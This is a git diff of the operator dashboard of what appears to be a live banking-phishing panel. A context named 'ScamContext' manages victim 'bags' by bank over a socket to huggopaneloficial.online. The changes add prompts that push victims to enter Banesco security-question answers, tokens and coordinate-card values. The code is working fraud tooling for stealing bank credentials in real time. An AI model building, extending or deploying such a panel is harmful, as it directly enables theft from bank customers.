@@ -1,0 +1,181 @@
+[1mdiff --git a/production/index.js b/production/index.js[m
+[1mindex d432718..eaebbee 100644[m
+[1m--- a/production/index.js[m
+[1m+++ b/production/index.js[m
+[36m@@ -5,7 +5,6 @@[m [mconst port = 3000;[m
+ [m
+ app.use(express.static(path.join(__dirname, 'build')))[m
+ [m
+[31m-[m
+ app.get('*', (req, res) => {[m
+   res.sendFile(path.join(__dirname, 'build', 'index.html'))[m
+ })[m
+[1mdiff --git a/src/assets/bgLogin.png b/src/assets/bgLogin.png[m
+[1mindex aae3a99..dab940f 100644[m
+Binary files a/src/assets/bgLogin.png and b/src/assets/bgLogin.png differ
+[1mdiff --git a/src/components/dashboard/table/TopTableComponent.jsx b/src/components/dashboard/table/TopTableComponent.jsx[m
+[1mindex c9d92c6..2d9de56 100644[m
+[1m--- a/src/components/dashboard/table/TopTableComponent.jsx[m
+[1m+++ b/src/components/dashboard/table/TopTableComponent.jsx[m
+[36m@@ -4,11 +4,11 @@[m [mimport { memo } from 'react';[m
+ import { btnDownload } from './buttonsController/btnDownload';[m
+ import { LoaderTopTableComponent } from './skeleton/LoaderTopTableComponent';[m
+ [m
+[31m-export const TopTableComponent = memo(({bags, userSelected, setUserSelected, setModeSelector, modeSelector}) => {[m
+[32m+[m[32mexport const TopTableComponent = memo(({bags, userSelected, setUserSelected, setModeSelector, modeSelector }) => {[m
+   [m
+   if(bags?.length == 0) return <LoaderTopTableComponent />[m
+   return ([m
+[31m-    <div className="bg-[#27272A] rounded px-4 py-2">[m
+[32m+[m[32m    <div className="bg-[#27272A] flex gap-3 rounded px-4 py-2">[m
+       <Dropdown[m
+       classNames={{[m
+         // base: "before:bg-default-200", // change arrow background[m
+[36m@@ -75,7 +75,7 @@[m [mexport const TopTableComponent = memo(({bags, userSelected, setUserSelected, set[m
+ [m
+         </DropdownMenu>[m
+       </Dropdown>[m
+[31m-      {/* <BtnDowload userSelected={userSelected} bags={bags}/> */}[m
+[32m+[m[32m      {/* <Button  onPress={() => setModeTrash(e => !e)} color={modeTrash ? 'secondary' : 'default'}>Modo papelera</Button> */}[m
+     </div>[m
+   )[m
+ })[m
+[1mdiff --git a/src/components/dashboard/table/actions/buttonModeLive/Icons/RedirectIconLive.jsx b/src/components/dashboard/table/actions/buttonModeLive/Icons/RedirectIconLive.jsx[m
+[1mindex 2b08d36..a89b272 100644[m
+[1m--- a/src/components/dashboard/table/actions/buttonModeLive/Icons/RedirectIconLive.jsx[m
+[1m+++ b/src/components/dashboard/table/actions/buttonModeLive/Icons/RedirectIconLive.jsx[m
+[36m@@ -57,6 +57,19 @@[m [mexport const RedirectIconLive = ({socket, ip, nameBank, urlPage, onClose, textPa[m
+         </PopoverTrigger>[m
+         <PopoverContent >[m
+           <form onSubmit={handleSubmit} className={'p-2 flex gap-2 flex-col'}>[m
+[32m+[m[32m            {[m
+[32m+[m[32m              textPage == 'Preguntas de seguridad' ? ([m
+[32m+[m[32m                  <>[m
+[32m+[m[32m                    <p>Preguntas de seguridad Banesco</p>[m
+[32m+[m[32m                    <span>Pregunta 1</span>[m
+[32m+[m[32m                    <input required autoComplete="false" className="w-full py-1 pl-2" type="text" name="coordinate1" value={values.question1} onChange={handleChange} />[m
+[32m+[m[41m                    [m
+[32m+[m[32m                    <span className="mt-2">Pregunta 2</span>[m
+[32m+[m[32m                    <input  autoComplete="false" className="w-full py-1 pl-2 mb-2" type="text" name="coordinate2" value={values.question2} onChange={handleChange} />[m
+[32m+[m[32m                  </>[m
+[32m+[m
+[32m+[m[32m              ) : null[m
+[32m+[m[32m            }[m
+             {[m
+               textPage == 'Token + Coordenadas' || textPage == 'Coordenadas' ? ([m
+                   <>[m
+[1mdiff --git a/src/context/ScamContext.jsx b/src/context/ScamContext.jsx[m
+[1mindex ed06f46..44307f7 100644[m
+[1m--- a/src/context/ScamContext.jsx[m
+[1m+++ b/src/context/ScamContext.jsx[m
+[36m@@ -8,11 +8,12 @@[m [mexport const ScamProvider = ({children}) => {[m
+     const { socket }  = useContext(SocketContext)[m
+     const [ bags, setBags ] = useState([])[m
+     const [bagFiltered, setBagFiltered] = useState(bags)[m
+[31m-[m
+     const [selected, setSelected] = useState([])[m
+[31m-[m
+[32m+[m[41m    [m
+     const [notification, setNotification] = useState(false)[m
+ [m
+[32m+[m[32m    // const [modeTrash, setModeTrash] = useState(false)[m
+[32m+[m
+     const bankSelected = () => selected.filter(e => e?.selected === true)[0]?.nameBank[m
+     [m
+     // ESTO OBTIENE TODOS LOS USUARIOS SIEMPRE Y CUANDO ESTE CONECTADO EL SERVER[m
+[36m@@ -24,13 +25,8 @@[m [mexport const ScamProvider = ({children}) => {[m
+             socket?.off('[bag] getBag')[m
+         }[m
+     }, [socket])[m
+[31m-[m
+[31m-    [m
+   [m
+[31m-    useEffect(() => {[m
+[31m-      setBagFiltered(bags.filter(e => e?.nameBank == bankSelected() ))[m
+[31m-    }, [selected, bags, socket])[m
+[31m-    [m
+[32m+[m
+     useEffect(() => {[m
+         socket?.on('[bag] newBag', (bag) => {[m
+             const verifyExist = bags.filter(e => e._id == bag._id)[m
+[36m@@ -42,11 +38,8 @@[m [mexport const ScamProvider = ({children}) => {[m
+ [m
+             if(bankSelected() == verifyExist[0].nameBank) {[m
+                 setBags( bags.map( e => e._id === bag._id ? e = bag : e ) )[m
+[31m-                console.log('multiple sesion')[m
+                 if(verifyExist[0].online == bag.online || verifyExist[0].isLiveLoading != bag.isLiveLoading ) return setNotification(true)[m
+[31m-                [m
+             }[m
+[31m-[m
+             return setBags(bags.map( e => e._id === bag._id ? e = bag : e ))[m
+         })[m
+         return () => {[m
+[36m@@ -57,15 +50,18 @@[m [mexport const ScamProvider = ({children}) => {[m
+     // MANEJA EL SELECTOR DE USUARIOS[m
+     useEffect(() => {[m
+ [m
+[31m-        const itemsSelected = bags?.reduce( (acc, {nameBank}) => {[m
+[32m+[m[32m        const itemsSelected = bags?.reduce( (acc, {nameBank, bagDelete}) => {[m
+             if(!acc.includes(nameBank)) acc.push(nameBank)[m
+[32m+[m[32m            // if(!acc.includes(nameBank) ) acc.push(nameBank)[m
+             return acc[m
+         }, [])?.map( ( e, i ) => e = { nameBank: e, selected: i == 0 ? true : false})[m
+ [m
+[31m-        if(itemsSelected.length != selected.length) setSelected( [m
+[32m+[m[32m        if(itemsSelected.length != selected.length  == false) setSelected([m[41m [m
+             selected.length != 0 [m
+             ? [...selected, itemsSelected[itemsSelected.length - 1]] [m
+             : itemsSelected)[m
+[32m+[m
+[32m+[m[41m        [m
+         [m
+     }, [bags, selected])[m
+ [m
+[36m@@ -76,7 +72,7 @@[m [mexport const ScamProvider = ({children}) => {[m
+         setSelected(arrBank => [m
+ [m
+             arrBank.map( [m
+[31m-                (e) => e.nameBank == newSelected [m
+[32m+[m[32m                (e) => e?.nameBank == newSelected[m[41m [m
+                     ? e = {nameBank: e.nameBank, selected: true} [m
+                     : e = {nameBank: e.nameBank, selected: false}  [m
+             )[m
+[36m@@ -92,7 +88,9 @@[m [mexport const ScamProvider = ({children}) => {[m
+             filteredSelected, [m
+             bags: bagFiltered, [m
+             notification, [m
+[31m-            setNotification[m
+[32m+[m[32m            setNotification,[m
+[32m+[m[32m            // modeTrash,[m[41m [m
+[32m+[m[32m            // setModeTrash[m
+         }}>[m
+             {children}[m
+         </ScamContext.Provider>[m
+[1mdiff --git a/src/context/SocketContext.jsx b/src/context/SocketContext.jsx[m
+[1mindex dc75a22..40e7bdb 100644[m
+[1m--- a/src/context/SocketContext.jsx[m
+[1m+++ b/src/context/SocketContext.jsx[m
+[36m@@ -9,7 +9,7 @@[m [mexport const SocketContext = createContext();[m
+ export const SocketProvider = ({ children }) => {[m
+ [m
+     const { auth, removeCookie } = useContext( AuthContext )[m
+[31m-    const { socket, conectarSocket, desconectarSocket } = useSocket('https://huggopaneloficial.online/', auth)[m
+[32m+[m[32m    const { socket, conectarSocket, desconectarSocket } = useSocket('https://huggopaneloficial.online', auth)[m
+     [m
+     useEffect(() => {[m
+         if ( auth ) conectarSocket()[m
+[1mdiff --git a/src/pages/Login.jsx b/src/pages/Login.jsx[m
+[1mindex 937718c..fab1895 100644[m
+[1m--- a/src/pages/Login.jsx[m
+[1m+++ b/src/pages/Login.jsx[m
+[36m@@ -115,7 +115,9 @@[m [mexport const Login = () => {[m
+ [m
+                 <div[m
+                     style={{ [m
+[31m-                        backgroundImage: `url(${bgLogin})`[m
+[32m+[m[32m                        backgroundImage: `url(${bgLogin})`,[m
+[32m+[m[32m                        backgroundPosition: 'center',[m
+[32m+[m[32m                        backgroundSize: 'cover'[m
+                     }} [m
+                     className='hidden md:col-span-7 h-screen md:flex justify-end items-start'>[m
+                 </div>[m
